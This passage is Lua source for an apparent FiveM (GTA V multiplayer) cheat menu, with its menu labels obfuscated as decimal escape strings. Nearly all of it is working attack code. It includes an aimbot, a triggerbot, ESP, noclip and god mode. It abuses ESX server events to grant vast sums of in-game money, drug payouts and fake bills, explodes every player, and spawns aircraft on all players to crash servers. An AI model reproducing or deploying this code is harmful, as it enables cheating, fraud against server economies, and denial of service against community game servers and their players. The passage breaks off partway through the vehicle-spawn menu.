						LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

						TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

						ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
						ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
						ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
						ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
						ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
						ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
						ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
						ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

						DrawLine(
							LineOneBegin.x,
							LineOneBegin.y,
							LineOneBegin.z,
							LineOneEnd.x,
							LineOneEnd.y,
							LineOneEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							LineTwoBegin.x,
							LineTwoBegin.y,
							LineTwoBegin.z,
							LineTwoEnd.x,
							LineTwoEnd.y,
							LineTwoEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							LineThreeBegin.x,
							LineThreeBegin.y,
							LineThreeBegin.z,
							LineThreeEnd.x,
							LineThreeEnd.y,
							LineThreeEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							LineThreeEnd.x,
							LineThreeEnd.y,
							LineThreeEnd.z,
							LineFourBegin.x,
							LineFourBegin.y,
							LineFourBegin.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							TLineOneBegin.x,
							TLineOneBegin.y,
							TLineOneBegin.z,
							TLineOneEnd.x,
							TLineOneEnd.y,
							TLineOneEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							TLineTwoBegin.x,
							TLineTwoBegin.y,
							TLineTwoBegin.z,
							TLineTwoEnd.x,
							TLineTwoEnd.y,
							TLineTwoEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							TLineThreeBegin.x,
							TLineThreeBegin.y,
							TLineThreeBegin.z,
							TLineThreeEnd.x,
							TLineThreeEnd.y,
							TLineThreeEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							TLineThreeEnd.x,
							TLineThreeEnd.y,
							TLineThreeEnd.z,
							TLineFourBegin.x,
							TLineFourBegin.y,
							TLineFourBegin.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							ConnectorOneBegin.x,
							ConnectorOneBegin.y,
							ConnectorOneBegin.z,
							ConnectorOneEnd.x,
							ConnectorOneEnd.y,
							ConnectorOneEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							ConnectorTwoBegin.x,
							ConnectorTwoBegin.y,
							ConnectorTwoBegin.z,
							ConnectorTwoEnd.x,
							ConnectorTwoEnd.y,
							ConnectorTwoEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							ConnectorThreeBegin.x,
							ConnectorThreeBegin.y,
							ConnectorThreeBegin.z,
							ConnectorThreeEnd.x,
							ConnectorThreeEnd.y,
							ConnectorThreeEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)
						DrawLine(
							ConnectorFourBegin.x,
							ConnectorFourBegin.y,
							ConnectorFourBegin.z,
							ConnectorFourEnd.x,
							ConnectorFourEnd.y,
							ConnectorFourEnd.z,
							ra.r,
							ra.g,
							ra.b,
							255
						)

						DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
					end
				end
			end
			if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
				SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
			end

			if oneshot then
				SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
				local gotEntity = getEntity(PlayerId())
				if IsEntityAPed(gotEntity) then
					if IsPedInAnyVehicle(gotEntity, true) then
						if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
							if IsControlJustReleased(1, 69) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						else
							if IsControlJustReleased(1, 142) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						end
					end
				elseif IsEntityAVehicle(gotEntity) then
					if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
						if IsControlJustReleased(1, 69) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					else
						if IsControlJustReleased(1, 142) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					end
				end
			else
				SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
			end

			if blowall then
                for i = 0, 64 do
						AddExplosion(GetEntityCoords(GetPlayerPed(i)), 2, 100000.0, true, false, 100000.0)
                end
			end

			if BlowDrugsUp then
				TriggerServerEvent("esx_drugs:startHarvestWeed")
				TriggerServerEvent("esx_drugs:startHarvestCoke")
				TriggerServerEvent("esx_drugs:startHarvestMeth")
				TriggerServerEvent("esx_drugs:startTransformOpium")
				TriggerServerEvent("esx_drugs:startTransformWeed")
				TriggerServerEvent("esx_drugs:startTransformCoke")
				TriggerServerEvent("esx_drugs:startTransformMeth")
				TriggerServerEvent("esx_drugs:startTransformOpium")
				TriggerServerEvent("esx_drugs:startSellWeed")
				TriggerServerEvent("esx_drugs:startSellCoke")
				TriggerServerEvent("esx_drugs:startSellMeth")
				TriggerServerEvent("esx_drugs:startSellOpium")
			end

			if esxdestroy then
				for i = 0, 64 do
						TriggerServerEvent('esx_truckerjob:pay', 9999999999)
						TriggerServerEvent('AdminMenu:giveCash', 9999999999)
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "\76\121\110\120\32\77\101\110\117\32\53\10", 10000000)
				end
			end
			
			if servercrasher then
				local avion = "CARGOPLANE"
				for i = 0, 64 do
						while not HasModelLoaded(GetHashKey(avion)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(avion))
						end
						Citizen.Wait(200)

						local avion2 = CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) -200, true, true) and
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) -100, true, true)
					end
			end

			if nuke then
				local camion = "phantom"
				local avion = "CARGOPLANE"
				local avion2 = "luxor"
				local heli = "maverick"
				local random = "bus"
                for i = 0, 64 do
						while not HasModelLoaded(GetHashKey(avion)) do
							Citizen.Wait(0)
							RequestModel(GetHashKey(avion))
						end
						Citizen.Wait(200)

						local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and 
						CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and 
						CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true)
                end
			end

			if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
				if IsControlPressed(0, 209) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
				elseif IsControlPressed(0, 210) then
					SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
				end
			end

			if TriggerBot then
				local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
				if Aiming then
					if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
						ShootPlayer(Entity)
					end
				end
			end

			if AimBot then
				for i = 0, 64 do
					if i ~= PlayerId() then
						if IsPlayerFreeAiming(PlayerId()) then
							local TargetPed = GetPlayerPed(i)
							local TargetPos = GetEntityCoords(TargetPed)
							local Exist = DoesEntityExist(TargetPed)
							local Dead = IsPlayerDead(TargetPed)

							if Exist and not Dead then
								local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
								if IsEntityVisible(TargetPed) and OnScreen then
									if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 10000) then
										local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
										SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
									end
								end
							end
						end
					end
				end
			end

			DisplayRadar(true)

			if RainbowVeh then
				local ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			end

			if Noclip then
				local currentSpeed = 2
				local noclipEntity =
					IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityInvincible(PlayerPedId(), true)

				local newPos = GetEntityCoords(entity)

				DisableControlAction(0, 32, true) --MoveUpOnly
				DisableControlAction(0, 268, true) --MoveUp

				DisableControlAction(0, 31, true) --MoveUpDown

				DisableControlAction(0, 269, true) --MoveDown
				DisableControlAction(0, 33, true) --MoveDownOnly

				DisableControlAction(0, 266, true) --MoveLeft
				DisableControlAction(0, 34, true) --MoveLeftOnly

				DisableControlAction(0, 30, true) --MoveLeftRight

				DisableControlAction(0, 267, true) --MoveRight
				DisableControlAction(0, 35, true) --MoveRightOnly

				DisableControlAction(0, 44, true) --Cover
				DisableControlAction(0, 20, true) --MultiplayerInfo

				local yoff = 0.0
				local zoff = 0.0

				if GetInputMode() == "MouseAndKeyboard" then
					if IsDisabledControlPressed(0, 32) then
						yoff = 0.5
					end
					if IsDisabledControlPressed(0, 33) then
						yoff = -0.5
					end
					if IsDisabledControlPressed(0, 34) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
					end
					if IsDisabledControlPressed(0, 35) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
					end
					if IsDisabledControlPressed(0, 44) then
						zoff = 0.21
					end
					if IsDisabledControlPressed(0, 20) then
						zoff = -0.21
					end
				end

				newPos =
					GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

				local heading = GetEntityHeading(noclipEntity)
				SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
				SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
				SetEntityHeading(noclipEntity, heading)

				SetEntityCollision(noclipEntity, false, false)
				SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

				FreezeEntityPosition(noclipEntity, false)
				SetEntityInvincible(noclipEntity, false)
				SetEntityCollision(noclipEntity, true, true)
			end
		end
	end
)

function GetPlayers()
	local players = {}

	for i = 0, 31 do
		if NetworkIsPlayerActive(i) then
			table.insert(players, i)
		end
	end

	return players
end


Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1


		WarMenu.CreateMenu("\76\121\110\120\77\97\105\110\77\101\110\117\10", "\72\97\109\72\97\120\105\97\32\49\46\48") 
		WarMenu.SetSubTitle("\76\121\110\120\77\97\105\110\77\101\110\117\10", "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\103\103\47\112\56\114\74\81\85\81")
		WarMenu.CreateSubMenu("\83\101\108\102\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		WarMenu.CreateSubMenu("\88\112\111\115\101\100\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		WarMenu.CreateSubMenu("\68\101\115\116\114\111\121\101\114\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		WarMenu.CreateSubMenu("\86\101\104\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		WarMenu.CreateSubMenu("\83\101\114\118\101\114\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		WarMenu.CreateSubMenu("\84\101\108\101\112\111\114\116\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		WarMenu.CreateSubMenu('\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	', '\76\121\110\120\77\97\105\110\77\101\110\117\10', '\76\121\110\120\32\77\101\110\117\32\53\10')
		WarMenu.CreateSubMenu('\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10', '\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	', '\76\121\110\120\32\77\101\110\117\32\53\10')
		WarMenu.CreateSubMenu('\83\105\110\103\108\101\87\101\112\80\108\97\121\101\114\10	', '\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	', '\76\121\110\120\32\77\101\110\117\32\53\10')
		WarMenu.CreateSubMenu("\87\101\112\77\101\110\117\10", "\76\121\110\120\77\97\105\110\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		WarMenu.CreateSubMenu("\83\105\110\103\108\101\87\101\112\77\101\110\117\10", "\87\101\112\77\101\110\117\10", "\76\121\110\120\32\77\101\110\117\32\53\10")
		WarMenu.CreateSubMenu("\69\83\88\66\111\115\115\10", "\83\101\114\118\101\114\77\101\110\117\10", "\69\83\88\32\66\111\115\115\32\77\101\110\117\115\10")
		WarMenu.CreateSubMenu("\69\83\88\77\111\110\101\121\10", "\83\101\114\118\101\114\77\101\110\117\10", "\69\83\88\32\77\111\110\101\121\32\79\112\116\105\111\110\115\10")
		WarMenu.CreateSubMenu("\69\83\88\77\105\115\99\10", "\83\101\114\118\101\114\77\101\110\117\10", "\69\83\88\32\77\105\115\99\32\79\112\116\105\111\110\115\10")
		WarMenu.CreateSubMenu("\69\83\88\68\114\117\103\115\10	", "\83\101\114\118\101\114\77\101\110\117\10", "\69\83\88\32\68\114\117\103\115\10")
		WarMenu.CreateSubMenu("\77\105\115\99\83\101\114\118\101\114\79\112\116\105\111\110\115\10", "\83\101\114\118\101\114\77\101\110\117\10", "\77\105\115\99\32\83\101\114\118\101\114\32\79\112\116\105\111\110\115\10")
		WarMenu.CreateSubMenu("\86\82\80\79\112\116\105\111\110\115\10", "\83\101\114\118\101\114\77\101\110\117\10", "\86\82\80\32\83\101\114\118\101\114\32\79\112\116\105\111\110\115\10")

		local SelectedPlayer

		while Enabled do
			if WarMenu.IsMenuOpened("\76\121\110\120\77\97\105\110\77\101\110\117\10") then
				if WarMenu.MenuButton("\126\104\126\83\101\108\102\32\77\101\110\117\10", "\83\101\108\102\77\101\110\117\10") then
				elseif WarMenu.MenuButton("\126\104\126\79\110\108\105\110\101\32\80\108\97\121\101\114\115\10", "\79\110\108\105\110\101\80\108\97\121\101\114\77\101\110\117\10	") then
				elseif WarMenu.MenuButton("\126\104\126\88\112\111\115\101\100\10", "\88\112\111\115\101\100\10") then
				elseif WarMenu.MenuButton("\126\104\126\68\101\115\116\114\111\121\101\114\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\66\50\48\48\48\48\39\62\126\104\126\62\58\51\10", "\68\101\115\116\114\111\121\101\114\10") then
				elseif WarMenu.MenuButton("\126\104\126\84\101\108\101\112\111\114\116\32\77\101\110\117\10", "\84\101\108\101\112\111\114\116\77\101\110\117\10") then
				elseif WarMenu.MenuButton("\126\104\126\86\101\104\105\99\108\101\32\77\101\110\117\10", "\86\101\104\77\101\110\117\10") then
				elseif WarMenu.MenuButton("\126\104\126\87\101\97\112\111\110\32\77\101\110\117\10", "\87\101\112\77\101\110\117\10") then
				elseif WarMenu.MenuButton("\126\104\126\76\85\65\32\60\70\79\78\84\32\67\79\76\79\82\61\39\35\66\50\48\48\48\48\39\62\126\104\126\69\120\101\99\117\116\111\114\10", "\83\101\114\118\101\114\77\101\110\117\10") then
				elseif WarMenu.Button("\126\114\126\126\104\126\80\97\110\105\99\32\75\101\121\126\115\126\32\47\32\126\114\126\68\105\115\97\98\108\101\32\77\101\110\117\10") then
					Enabled = false
				elseif WarMenu.Button("\66\97\115\101\100\32\111\110\32\82\117\98\121\39\115\32\83\111\117\114\99\101\32\67\111\100\101\10") then
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\83\101\108\102\77\101\110\117\10") then
				
				if
					WarMenu.CheckBox(
						"~h~~g~God~s~Mode",
						Godmode,
						function(enabled)
							Godmode = enabled
						end
					)
				 then
				elseif WarMenu.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif WarMenu.Button("~h~~g~ESX~s~ ~s~Revive yourself~s~") then
					TriggerEvent("esx_ambulancejob:revive")
				elseif WarMenu.Button("~h~~g~Heal") then
					SetEntityHealth(PlayerPedId(), 200)
				elseif WarMenu.Button("~h~~b~Give Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif
				WarMenu.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				WarMenu.CheckBox("~h~Fast Run",fastrun,function(enabled)fastrun = enabled end)
				then
				elseif
				WarMenu.CheckBox(
					"~h~Super Jump",
					SuperJump,
					function(enabled)
					SuperJump = enabled
					end)
				then
				elseif
				WarMenu.CheckBox(
					"~h~Invisible",
					Invisible,
					function(enabled)
					Invisible = enabled
					end)
				then
				elseif
				WarMenu.CheckBox("~h~Noclip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\84\101\108\101\112\111\114\116\77\101\110\117\10") then
				
				if WarMenu.Button("~h~Teleport to waypoint") then
				TeleportToWaypoint()

				elseif WarMenu.Button("~h~Teleport into nearest vehicle") then
					local playerPed = GetPlayerPed(-1)
					local playerPedPos = GetEntityCoords(playerPed, true)
					local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
					local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
					local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
					local NearestPlanePos = GetEntityCoords(NearestPlane, true)
				drawNotification("~y~Wait...")
				Citizen.Wait(1000)
				if (NearestVehicle == 0) and (NearestPlane == 0) then
					drawNotification("~r~No Vehicle Found")
				elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
					if IsVehicleSeatFree(NearestPlane, -1) then
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					end
					drawNotification("~g~Teleported Into Nearest Vehicle!")
				elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
					if IsVehicleSeatFree(NearestVehicle, -1) then
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					end
					drawNotification("~g~Teleported Into Nearest Vehicle!")
				elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
					if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestVehicle, -1) then
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
						end
					elseif Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) > Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestPlane, -1) then
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						else
							local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
							ClearPedTasksImmediately(driverPed)
							SetEntityAsMissionEntity(driverPed, 1, 1)
							DeleteEntity(driverPed)
							SetPedIntoVehicle(playerPed, NearestPlane, -1)
							SetVehicleAlarm(NearestPlane, false)
							SetVehicleDoorsLocked(NearestPlane, 1)
							SetVehicleNeedsToBeHotwired(NearestPlane, false)
						end
					end
					drawNotification("~g~Teleported Into Nearest Vehicle!")
				end

			 end

								
		WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\88\112\111\115\101\100\10") then
				
			if
				WarMenu.CheckBox(
				"~h~TriggerBot",
				TriggerBot,
				function(enabled)
				TriggerBot = enabled
				end)
			 then
			elseif
				WarMenu.CheckBox(
				"~h~AimBot",
				AimBot,
				function(enabled)
				AimBot = enabled
				end)
			then
			elseif
				WarMenu.CheckBox(
				"~h~ESP",
				esp,
				function(enabled)
				esp = enabled
				end)
			then
			elseif
				WarMenu.CheckBox(
				"~h~Player Blips",
				playerBlips,
				function(enabled)
				playerBlips = enabled
				end)
			then
			elseif
				WarMenu.CheckBox(
				"~h~~r~EMP~s~ Nearest Vehicles",
				destroyvehicles,
				function(enabled)
				destroyvehicles = enabled
				end) 
			then
			elseif
				WarMenu.CheckBox(
				"~h~~r~Explode~s~ Nearest Vehicles",
				explodevehicles,
				function(enabled)
				explodevehicles = enabled
				end) 
			then
			end

		WarMenu.Display()
		elseif WarMenu.IsMenuOpened("\68\101\115\116\114\111\121\101\114\10") then
			
			if
				WarMenu.CheckBox(
				"~h~Explode everyone",
				blowall,
				function(enabled)
				blowall = enabled
				end)
			then
			elseif
				WarMenu.CheckBox(
				"~h~~y~Nuke ~s~everyone ~r~(CRASH)",
				nuke,
				function(enabled)
				nuke = enabled
				end)
			then
			elseif
				WarMenu.CheckBox(
				"~h~~g~ESX ~r~DESTROY",
				esxdestroy,
				function(enabled)
				esxdestroy = enabled
				end)
			then
			elseif
				WarMenu.CheckBox(
				"~h~~r~Server crasher",
				servercrasher,
				function(enabled)
				servercrasher = enabled
				end)
			then
			end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\87\101\112\77\101\110\117\10") then
				
				if WarMenu.Button("~h~~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif WarMenu.Button("~h~~r~Remove All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif WarMenu.Button("~h~~r~Give All Weapons to everyone") then
					for ids = 0, 64 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
								GiveWeaponToPed(PlayerPedId(ids), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end
			end
				elseif WarMenu.Button("~h~~r~Remove All Weapons from everyone") then
					for ids = 0, 64 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
							RemoveAllPedWeapons(PlayerPedId(ids), true)
				end	
			end
		end
				elseif WarMenu.Button("~h~Give Ammo") then
					for i = 1, #allWeapons do
						AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 200)
					end
				elseif WarMenu.MenuButton("~h~Give Specific Weapon", "\83\105\110\103\108\101\87\101\112\77\101\110\117\10") then
				elseif
					WarMenu.ComboBox(
						"~h~Weapon/Melee Damage",
						{"1x (Default)", "2x", "3x", "4x", "5x"},
						currentItemIndex,
						selectedItemIndex,
						function(currentIndex, selectedIndex)
							currentItemIndex = currentIndex
							selectedItemIndex = selectedIndex
							SetPlayerWeaponDamageModifier(PlayerId(), selectedItemIndex)
							SetPlayerMeleeWeaponDamageModifier(PlayerId(), selectedItemIndex)
						end
					)
				 then
				elseif
					WarMenu.CheckBox(
						"~h~~r~ONE SHOT KILL",
						oneshot,
						function(enabled)
							oneshot = enabled
						end)
				 then
				 elseif
				 WarMenu.CheckBox(
					 "~h~Infinite Ammo",
					 InfAmmo,
					 function(enabled)
						 InfAmmo = enabled
						 SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
					 end)
			  then
				 elseif
					 WarMenu.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 WarMenu.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\83\105\110\103\108\101\87\101\112\77\101\110\117\10") then
				for i = 1, #allWeapons do
					if WarMenu.Button(allWeapons[i]) then
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				end

				WarMenu.Display()
			elseif WarMenu.IsMenuOpened("\86\101\104\77\101\110\117\10") then
				
				if WarMenu.Button("~h~~g~Spawn Vehicle") then
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
					if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
						RequestModel(ModelName)
						while not HasModelLoaded(ModelName) do
							Citizen.Wait(0)
						end

						local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)

